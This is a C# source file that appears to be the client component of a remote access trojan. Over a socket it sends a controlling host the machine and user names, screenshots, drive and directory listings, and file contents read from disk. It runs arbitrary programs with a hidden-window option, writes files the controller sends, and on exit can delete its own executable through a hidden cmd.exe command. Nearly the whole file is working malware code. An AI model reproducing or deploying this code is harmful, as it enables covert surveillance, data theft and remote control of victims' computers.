using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
namespace Client.Classes
{
    class Commands
    {
        public static void SendData(Socket soc, byte[] data)
        {
            try
            {
                soc.Send(data);
            }
            catch (Exception ex)
            {

            }
        }
        public static void SystemInformatin(Socket soc)
        {
            try
            {
                string computername = System.Environment.MachineName;
                string username = System.Environment.UserName;
                string cmd = "system.information|" + computername + "<" + username;
                int len = cmd.Length * 2;
                byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
                byte[] b2 = Encoding.Unicode.GetBytes(cmd);
                byte[] data = new byte[(len) + 16];
                b1.CopyTo(data, 0);
                b2.CopyTo(data, 16);
                SendData(soc, data);
            }
            catch { }
        }
        public static bool SendTestData(Socket soc)
        {
            try
            {
                string cmd = "test|none";
                int len = cmd.Length * 2;
                byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
                byte[] b2 = Encoding.Unicode.GetBytes(cmd);
                byte[] data = new byte[(len) + 16];
                b1.CopyTo(data, 0);
                b2.CopyTo(data, 16);
                SendData(soc, data);
                return true;
            }
            catch
            {
                return false;
            }
        }
        public static void run_program(string parameter)
        {
            try
            {
                string[] p = parameter.Split('<');
                string filename = p[0].Trim();
                string arguments = p[1].Trim();
                string winstyle = p[2].Trim();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = filename;
                if (arguments != "none") startInfo.Arguments = arguments;
                if (winstyle == "normal") startInfo.WindowStyle = ProcessWindowStyle.Normal;
                if (winstyle == "maximized") startInfo.WindowStyle = ProcessWindowStyle.Maximized;
                if (winstyle == "minimized") startInfo.WindowStyle = ProcessWindowStyle.Minimized;
                if (winstyle == "hidden") startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                //startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;
                Process.Start(startInfo);
            }
            catch
            {

            }
        }
        public static void exitApp(string delete)
        {
            try
            {
                if (delete == "true")
                {
                    ProcessStartInfo Info = new ProcessStartInfo();
                    Info.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " +
                                   System.Windows.Forms.Application.ExecutablePath;
                    Info.WindowStyle = ProcessWindowStyle.Hidden;
                    Info.CreateNoWindow = true;
                    Info.FileName = "cmd.exe";
                    Process.Start(Info);
                    try
                    {
                        System.Environment.Exit(System.Environment.ExitCode);
                    }
                    catch
                    {

                    }
                    System.Windows.Forms.Application.Exit();
                }
                else
                {
                    try
                    {
                        System.Environment.Exit(System.Environment.ExitCode);
                    }
                    catch
                    {

                    }
                    System.Windows.Forms.Application.Exit();
                }
            }
            catch
            {

            }
        }
        //======================================================================================Desktop screen
        private static Bitmap GrayScale(Bitmap Bmp)
        {
            int rgb;
            Color c;

            for (int y = 0; y < Bmp.Height; y++)
                for (int x = 0; x < Bmp.Width; x++)
                {
                    c = Bmp.GetPixel(x, y);
                    rgb = (int)((c.R + c.G + c.B) / 3);
                    Bmp.SetPixel(x, y, Color.FromArgb(rgb, rgb, rgb));
                }
            return Bmp;
        }
        private static Bitmap ResizeBitmap(Bitmap sourceBMP, int width, int height)
        {
            try
            {
                Bitmap result = new Bitmap(width, height);
                using (Graphics g = Graphics.FromImage(result))
                    g.DrawImage(sourceBMP, 0, 0, width, height);
                return result;
            }
            catch
            {
                return null;
            }
        }
        public static void GetDesktopScreen(Socket soc, string parameters)
        {
            Bitmap memoryImage;
            int count = 1;
            Bitmap[] images = new Bitmap[count];
            try
            {
                string[] ppp = parameters.Split('<');
                int width = int.Parse(ppp[0]);
                int height = int.Parse(ppp[1]);
                int type = int.Parse(ppp[2]);
                Screen[] screens = Screen.AllScreens;
                Rectangle rc;
                rc = Screen.PrimaryScreen.Bounds;
                for (int index = 0; index < count; index++)
                {
                    if (index > 0)
                        rc = screens[index].WorkingArea;
                    memoryImage = new Bitmap(rc.Width, rc.Height);
                    using (Graphics memoryGrahics = Graphics.FromImage(memoryImage))
                    {
                        memoryGrahics.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
                    }
                    images[index] = memoryImage;
                }
                Bitmap a = ResizeBitmap(images[0], width, height);
                if (type == 1)
                {
                    a = GrayScale(a);
                }
                //Bitmap a = GrayScale(images[0]);
                //Bitmap a = ConvertTo16bpp(images[0]);
                //a.Save(@"D:\" + DateTime.Now.Ticks.ToString() + ".jpg");
                //ImageConverter converter = new ImageConverter();
                //byte[] bbb = (byte[])converter.ConvertTo(a, typeof(byte[]));
                //string bbbb = Convert.ToBase64String(bbb);
                string bbbb = "";
                using (MemoryStream ms = new MemoryStream())
                {
                    // Convert Image to byte[]
                    a.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                    byte[] imageBytes = ms.ToArray();
                    // Convert byte[] to Base64 String
                    //string base64String = Convert.ToBase64String(imageBytes);
                    //bbbb = base64String;
                    //====================send result
                    string cmd = "system.screen|none";
                    int len = cmd.Length * 2;
                    byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
                    byte[] b2 = Encoding.Unicode.GetBytes(cmd);
                    byte[] data = new byte[(len) + 16 + imageBytes.Length];
                    b1.CopyTo(data, 0);
                    b2.CopyTo(data, 16);
                    imageBytes.CopyTo(data, 16 + b2.Length);
                    SendData(soc, data);
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
            }
        }
        //======================================================================================
        public static string get_drives()
        {
            try
            {
                string[] drives = Directory.GetLogicalDrives();
                string res = "";
                foreach (string t in drives)
                {
                    res += t + "\n";
                }
                return res;
            }
            catch
            {
                return "";
            }
        }
        public static void LoadRemoteDrives(Socket soc)
        {
            string cmd = "io.drive|" + get_drives();
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len) + 16];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        public static void LoadRemoteEntries(Socket soc, string path)
        {
            try
            {
                string res = "";
                string[] files = Directory.GetFiles(path);
                string[] dirs = Directory.GetDirectories(path);
                foreach (string t in dirs)
                {
                    FileInfo f = new FileInfo(t);
                    FileAttributes at = f.Attributes;
                    res += string.Format("{0}<{1}<{2}<{3}<{4}<{5}\n", Path.GetFileName(t), "-", "Directory", f.CreationTime, at, t);
                }
                foreach (string t in files)
                {
                    FileInfo f = new FileInfo(t);
                    FileAttributes at = f.Attributes;
                    res += string.Format("{0}<{1}<{2}<{3}<{4}<{5}\n", Path.GetFileName(t), f.Length, "File", f.CreationTime, at, t);
                }
                //System.Windows.Forms.MessageBox.Show(res);
                //string[] rrr = res.Split('\n');
                string cmd = "io.entries|" + res;
                //MessageBox.Show(cmd.Length.ToString());

                int len = cmd.Length * 2;
                byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
                byte[] b2 = Encoding.Unicode.GetBytes(cmd);
                byte[] data = new byte[(len) + 16];
                b1.CopyTo(data, 0);
                b2.CopyTo(data, 16);
                SendData(soc, data);
            }
            catch
            {
                //return "error";
                // MessageBox.Show("error");
            }
        }
        public static void SaveFile(string path, byte[] data)
        {
            try
            {
                File.WriteAllBytes(path, data);
            }
            catch
            {

            }
        }
        public static void UploadFile(Socket soc, string path, string target)
        {
            try
            {
                byte[] file = System.IO.File.ReadAllBytes(path);
                string cmd = "uploadfile|" + target;
                int len = cmd.Length * 2;
                byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
                byte[] b2 = Encoding.Unicode.GetBytes(cmd);
                byte[] data = new byte[(len) + 16 + file.Length];
                b1.CopyTo(data, 0);
                b2.CopyTo(data, 16);
                file.CopyTo(data, 16 + b2.Length);
                SendData(soc, data);
                //System.Windows.Forms.MessageBox.Show("Upload Completed.");
            }
            catch
            {

            }
        }
        public static void SendFileForEdit(Socket soc, string path)
        {
            try
            {
                string fil_content = File.ReadAllText(path);
                //byte[] file = Encoding.Unicode.GetBytes(fil_content);
                string cmd = "editfile|" + path + "<" + fil_content;
                int len = cmd.Length * 2;
                byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
                byte[] b2 = Encoding.Unicode.GetBytes(cmd);
                byte[] data = new byte[(len) + 16];
                b1.CopyTo(data, 0);
                b2.CopyTo(data, 16);
                //file.CopyTo(data, 16 + b2.Length);
                SendData(soc, data);
            }
            catch
            {

            }
        }
    }
}
